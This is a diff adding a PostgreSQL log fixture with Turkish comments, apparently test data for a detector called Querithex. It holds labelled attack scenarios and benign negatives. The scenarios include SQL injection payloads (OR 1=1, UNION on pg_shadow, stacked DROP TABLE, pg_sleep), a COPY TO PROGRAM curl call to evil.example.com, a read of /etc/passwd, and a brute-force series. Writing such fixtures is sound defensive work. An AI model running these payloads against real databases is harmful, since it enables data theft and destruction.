@@ -1,0 +1,91 @@
+# Querithex — elle yazılmış güvenlik/olay senaryoları
+# Format: Bölüm 5.1 (log_line_prefix = '%m [%p] %q%u@%d/%a %h ')
+# Kurallar: Bölüm 7.2 (S1-S9, B1-B3), Bölüm 9.1 (olaylar)
+
+# --- S1: Totoloji (OR 1=1) ---
+2026-10-30 14:30:15.123 UTC [10001] app_user@app/webapp 10.0.0.5 LOG:  duration: 12.500 ms  statement: SELECT * FROM users WHERE username = 'admin' OR 1=1 --' AND password = 'x';
+2026-10-30 14:30:16.456 UTC [10002] app_user@app/webapp 10.0.0.6 LOG:  duration: 8.200 ms  statement: SELECT * FROM products WHERE id = 5 OR '1'='1';
+
+# --- S2: UNION tabanlı ---
+2026-10-30 14:31:01.001 UTC [10003] app_user@app/webapp 10.0.0.7 LOG:  duration: 15.300 ms  statement: SELECT name FROM users WHERE id = 1 UNION SELECT null, null, null FROM pg_shadow;
+
+# --- S3: Stacked query ---
+2026-10-30 14:31:05.500 UTC [10004] app_user@app/webapp 10.0.0.8 LOG:  duration: 22.100 ms  statement: SELECT * FROM users WHERE id = 1; DROP TABLE users;
+
+# --- S4: Zaman tabanlı (pg_sleep) ---
+2026-10-30 14:31:10.250 UTC [10005] app_user@app/webapp 10.0.0.9 LOG:  duration: 5000.000 ms  statement: SELECT * FROM users WHERE id = 1 AND pg_sleep(5) IS NULL;
+
+# --- S5: Dosya/komut erişimi (Kritik) ---
+2026-10-30 14:31:15.750 UTC [10006] app_user@app/webapp 10.0.0.10 LOG:  duration: 3.400 ms  statement: COPY (SELECT '') TO PROGRAM 'curl http://evil.example.com/exfil';
+2026-10-30 14:31:16.100 UTC [10007] app_user@app/webapp 10.0.0.11 LOG:  duration: 1.200 ms  statement: SELECT pg_read_file('/etc/passwd');
+
+# --- S6: Katalog keşfi ---
+2026-10-30 14:31:20.500 UTC [10008] app_user@app/webapp 10.0.0.12 LOG:  duration: 2.100 ms  statement: SELECT * FROM information_schema.tables;
+2026-10-30 14:31:21.000 UTC [10009] app_user@app/webapp 10.0.0.13 LOG:  duration: 1.800 ms  statement: SELECT usename, passwd FROM pg_shadow;
+
+# --- S7: Tırnak + yorum kesmesi ---
+2026-10-30 14:31:25.300 UTC [10010] app_user@app/webapp 10.0.0.14 LOG:  duration: 9.700 ms  statement: SELECT * FROM users WHERE username = 'admin' --' AND password = 'x';
+
+# --- S8: Yıkıcı DDL ---
+2026-10-30 14:31:30.100 UTC [10011] app_user@app/webapp 10.0.0.15 LOG:  duration: 45.600 ms  statement: DROP TABLE customers;
+
+# --- S9: Parola içeren komut ---
+2026-10-30 14:31:35.500 UTC [10012] app_user@app/webapp 10.0.0.16 LOG:  duration: 6.200 ms  statement: CREATE USER hacker WITH PASSWORD 'secret123';
+
+# --- B1: Kaba kuvvet (aynı IP'den 5+ auth hatası) ---
+2026-10-30 14:32:01.100 UTC [20001] LOG:  connection authorized: user=postgres database=app
+2026-10-30 14:32:01.200 UTC [20001] FATAL:  password authentication failed for user "admin"
+2026-10-30 14:32:02.100 UTC [20002] FATAL:  password authentication failed for user "admin"
+2026-10-30 14:32:03.100 UTC [20003] FATAL:  password authentication failed for user "admin"
+2026-10-30 14:32:04.100 UTC [20004] FATAL:  password authentication failed for user "admin"
+2026-10-30 14:32:05.100 UTC [20005] FATAL:  password authentication failed for user "admin"
+2026-10-30 14:32:06.100 UTC [20006] FATAL:  password authentication failed for user "admin"
+
+# --- B2: Hata taraması (syntax error + does not exist) ---
+2026-10-30 14:33:01.100 UTC [30001] app_user@app/webapp 10.0.0.20 ERROR:  syntax error at or near "SELEC"
+2026-10-30 14:33:01.200 UTC [30001] app_user@app/webapp 10.0.0.20 STATEMENT:  SELEC * FROM users;
+2026-10-30 14:33:02.100 UTC [30002] app_user@app/webapp 10.0.0.20 ERROR:  relation "olmayan_tablo" does not exist
+2026-10-30 14:33:02.200 UTC [30002] app_user@app/webapp 10.0.0.20 STATEMENT:  SELECT * FROM olmayan_tablo;
+2026-10-30 14:33:03.100 UTC [30003] app_user@app/webapp 10.0.0.20 ERROR:  relation "yok_boyle" does not exist
+2026-10-30 14:33:03.200 UTC [30003] app_user@app/webapp 10.0.0.20 STATEMENT:  SELECT * FROM yok_boyle;
+
+# --- B3: Beklenmedik kaynak (yeni IP) ---
+2026-10-30 14:34:00.100 UTC [40001] new_user@app/webapp 203.0.113.99 LOG:  statement: SELECT 1;
+
+# --- Olaylar: deadlock ---
+2026-10-30 14:35:01.100 UTC [50001] app_user@app/webapp 10.0.0.30 ERROR:  deadlock detected
+2026-10-30 14:35:01.200 UTC [50001] app_user@app/webapp 10.0.0.30 DETAIL:  Process 50001 waits for ShareLock on transaction 12345; blocked by process 50002.
+2026-10-30 14:35:01.300 UTC [50001] app_user@app/webapp 10.0.0.30 HINT:  See server log for query details.
+2026-10-30 14:35:01.400 UTC [50001] app_user@app/webapp 10.0.0.30 STATEMENT:  UPDATE accounts SET balance = balance - 100 WHERE id = 1;
+
+# --- Olaylar: kilit beklemesi ---
+2026-10-30 14:35:10.100 UTC [50002] app_user@app/webapp 10.0.0.31 LOG:  process 50002 still waiting for ShareLock on transaction 12345 after 1000.123 ms
+2026-10-30 14:35:10.200 UTC [50002] app_user@app/webapp 10.0.0.31 DETAIL:  Process holding the lock: 50001. Wait queue: 50002.
+
+# --- Olaylar: statement timeout ---
+2026-10-30 14:35:20.100 UTC [50003] app_user@app/webapp 10.0.0.32 ERROR:  canceling statement due to statement timeout
+2026-10-30 14:35:20.200 UTC [50003] app_user@app/webapp 10.0.0.32 STATEMENT:  SELECT * FROM big_table WHERE x = 1;
+
+# --- Olaylar: bağlantı limiti ---
+2026-10-30 14:35:30.100 UTC [50004] FATAL:  sorry, too many clients already
+2026-10-30 14:35:30.200 UTC [50005] FATAL:  remaining connection slots are reserved for non-replication superuser connections
+
+# --- Olaylar: checkpoint ---
+2026-10-30 14:35:40.100 UTC [50006] LOG:  checkpoints are occurring too frequently (15 seconds apart)
+2026-10-30 14:35:40.200 UTC [50006] HINT:  Consider increasing the configuration parameter "max_wal_size".
+
+# --- Olaylar: geçici dosya ---
+2026-10-30 14:35:50.100 UTC [50007] app_user@app/webapp 10.0.0.33 LOG:  temporary file: path "base/pgsql_tmp/pgsql_tmp50007.0", size 1048576
+2026-10-30 14:35:50.200 UTC [50007] app_user@app/webapp 10.0.0.33 STATEMENT:  SELECT * FROM big_table ORDER BY x;
+
+# --- Olaylar: çökme / OOM ---
+2026-10-30 14:36:00.100 UTC [50008] LOG:  server process (PID 50008) was terminated by signal 9: Killed
+2026-10-30 14:36:00.200 UTC [50008] LOG:  terminating any other active server processes
+2026-10-30 14:36:00.300 UTC [50008] LOG:  database system was interrupted; last known up at 2026-10-30 14:35:00 UTC
+2026-10-30 14:36:00.400 UTC [50008] LOG:  database system was not properly shut down; automatic recovery in progress
+
+# --- Meşru sorgular (negatif test örnekleri) ---
+2026-10-30 14:37:00.100 UTC [60001] app_user@app/webapp 10.0.0.40 LOG:  duration: 1.200 ms  statement: SELECT id, name FROM users WHERE id = 42;
+2026-10-30 14:37:01.100 UTC [60002] app_user@app/webapp 10.0.0.41 LOG:  duration: 0.500 ms  statement: INSERT INTO orders (customer_id, amount) VALUES (1, 100.50);
+2026-10-30 14:37:02.100 UTC [60003] app_user@app/webapp 10.0.0.42 LOG:  duration: 2.300 ms  statement: UPDATE users SET email = 'new@example.com' WHERE id = 5;
+2026-10-30 14:37:03.100 UTC [60004] app_user@app/webapp 10.0.0.43 LOG:  duration: 1.800 ms  statement: SELECT count(*) FROM orders WHERE created_at > '2026-01-01';
